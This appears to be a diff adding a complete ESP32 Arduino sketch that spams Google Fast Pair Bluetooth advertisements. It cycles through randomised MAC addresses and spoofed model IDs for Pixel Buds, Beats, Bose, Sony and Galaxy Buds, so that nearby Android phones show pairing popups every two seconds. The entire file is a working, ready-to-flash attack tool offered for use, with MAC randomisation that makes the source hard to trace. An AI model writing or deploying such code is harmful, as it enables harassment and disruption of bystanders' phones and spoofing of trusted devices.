@@ -1,0 +1,137 @@
+/*
+ * ESP32 FastPair Spam - Pure BLE, Restart-based (Proven approach)
+ * 
+ * Inspired by iBeacon spam code - uses esp_base_mac_addr_set() 
+ * BEFORE BLE init + ESP.restart() for 100% reliable MAC change.
+ * 
+ * Hardware:
+ * - Any ESP32 dev board
+ * - Built-in LED (GPIO 2)
+ * - Just power it on - spam starts automatically
+ * - Power off to stop
+ * 
+ * Effect: Nearby Android phones get FastPair popups every 2 seconds
+ * for Pixel Buds Pro, Beats, Sony, Bose, JBL, Galaxy Buds, etc.
+ */
+
+#include <WiFi.h>
+#include <BLEDevice.h>
+#include <BLEServer.h>
+#include <BLEUtils.h>
+#include <BLEAdvertising.h>
+#include "soc/soc.h"
+#include "soc/rtc_cntl_reg.h"
+
+const int ledPin = 2;
+
+// ===== 12 VERIFIED GOOGLE FASTPAIR MODELS =====
+struct FPModel { uint32_t id; const char* name; };
+const FPModel models[] = {
+  {0x000001, "Pixel Buds"},
+  {0x000002, "Pixel Buds A"},
+  {0x000003, "Pixel Buds Pro"},
+  {0x01000C, "Beats Studio Buds"},
+  {0x010010, "Beats Fit Pro"},
+  {0x010020, "Beats Studio Pro"},
+  {0x04B85A, "JBL Flip 6"},
+  {0x05A836, "Bose NC 700"},
+  {0x07419C, "Bose QC Earbuds"},
+  {0x0A1A2C, "Sony WH-1000XM4"},
+  {0x0B1381, "Galaxy Buds Pro"},
+  {0x0C8A78, "Galaxy Buds 2"}
+};
+const int numModels = sizeof(models) / sizeof(models[0]);
+
+// ===== PERSISTENT COUNTER (survives restart via RTC memory) =====
+RTC_DATA_ATTR int bootCount = 0;
+RTC_DATA_ATTR uint32_t lastModelId = 0;
+
+void setup() {
+  Serial.begin(115200);
+  setCpuFrequencyMhz(240);
+  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
+  
+  // Disable WiFi to free radio for BLE
+  WiFi.mode(WIFI_OFF);
+  delay(50);
+  
+  // ===== STEP 1: Set RANDOM BASE MAC BEFORE BLE INIT =====
+  // This is the KEY - sets the controller's base MAC, which BLE uses
+  uint8_t mac[6];
+  esp_fill_random(mac, 6);
+  mac[0] &= 0xFE;  // Unicast (LSB = 0)
+  esp_base_mac_addr_set(mac);
+  
+  // ===== STEP 2: Pick random model (different from last one) =====
+  uint32_t modelId;
+  const char* deviceName;
+  do {
+    int idx = esp_random() % numModels;
+    modelId = models[idx].id;
+    deviceName = models[idx].name;
+  } while (modelId == lastModelId);  // Avoid repeating same model
+  lastModelId = modelId;
+  
+  bootCount++;
+  
+  Serial.printf("\n[Boot #%d] MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+    bootCount, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  Serial.printf("[Boot #%d] Device: %s (0x%06X)\n", bootCount, deviceName, modelId);
+  
+  // ===== STEP 3: Init BLE with device name =====
+  BLEDevice::init(deviceName);
+  
+  // ===== STEP 4: Create BLE Server =====
+  BLEServer *pServer = BLEDevice::createServer();
+  BLEAdvertising *pAdvertising = pServer->getAdvertising();
+  
+  // ===== STEP 5: Build FastPair advertisement data =====
+  BLEAdvertisementData advData;
+  
+  // Flags: LE General Discoverable + BR/EDR Not Supported
+  advData.setFlags(0x06);
+  
+  // Service Data: UUID 0xFE2F (FastPair) + Model ID (big-endian)
+  std::string strServiceData = "";
+  strServiceData += (char)6;       // Length (type + UUID + model = 6)
+  strServiceData += (char)0x16;    // Type: Service Data (16-bit UUID)
+  strServiceData += (char)0x2F;    // UUID low byte (0xFE2F little-endian)
+  strServiceData += (char)0xFE;    // UUID high byte
+  strServiceData += (char)((modelId >> 16) & 0xFF);  // Model ID byte 1
+  strServiceData += (char)((modelId >> 8) & 0xFF);   // Model ID byte 2
+  strServiceData += (char)(modelId & 0xFF);          // Model ID byte 3
+  advData.addData(strServiceData);
+  
+  // Complete Local Name (shows real device name in BLE scan list)
+  std::string strName = "";
+  strName += (char)(strlen(deviceName) + 1);  // Length
+  strName += (char)0x09;                        // Type: Complete Local Name
+  strName += deviceName;
+  advData.addData(strName);
+  
+  pAdvertising->setAdvertisementData(advData);
+  
+  // ===== STEP 6: Start advertising =====
+  pAdvertising->start();
+  Serial.println("[BLE] Advertising started - waiting 2 seconds...");
+  
+  // ===== STEP 7: Advertise for 2 seconds =====
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);  // LED on during advertising
+  
+  // Give Android time to scan and detect
+  delay(2000);
+  
+  digitalWrite(ledPin, LOW);
+  
+  // ===== STEP 8: Stop and restart =====
+  pAdvertising->stop();
+  delay(50);
+  Serial.println("[BLE] Restarting ESP32 for next cycle...\n");
+  ESP.restart();
+}
+
+void loop() {
+  // Empty - everything happens in setup()
+  // ESP restarts every 2 seconds
+}
